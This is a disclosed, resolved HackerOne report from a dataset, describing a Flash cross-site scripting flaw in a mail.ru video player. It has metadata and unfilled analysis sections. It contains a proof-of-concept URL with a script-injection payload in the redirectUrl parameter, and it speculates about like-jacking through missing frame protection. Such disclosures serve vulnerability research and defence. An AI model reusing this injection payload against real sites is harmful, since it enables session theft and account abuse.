---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '58831'
original_report_id: '58831'
title: Flash XSS on img.mail.ru
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2015-04-28T13:41:45.437Z'
disclosed_at: '2015-10-30T12:22:06.146Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Flash XSS on img.mail.ru

## Metadata

- HackerOne Report ID: 58831
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2015-10-30T12:22:06.146Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Vulnerable Flash File: http://img.mail.ru/r/video2/player_v2.swf

Steps:
+ Open http://img.mail.ru/r/video2/player_v2.swf?metadataUrl=http://videoapi.my.mail.ru/videos//community/mir/_groupvideo/921.json&redirectUrl=\%22));alert(document.domain);}catch(e){}//
+ Click on social share and click on anything (eg. twitter)

Severity:
+ XSS on 
+ There is an ActionScript function `ApplicationController.like` bound to javascript using external interface. So, I suspect that like jacking is possible since img.mail.ru doesn't send **X-FRAME-OPTIONS**.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
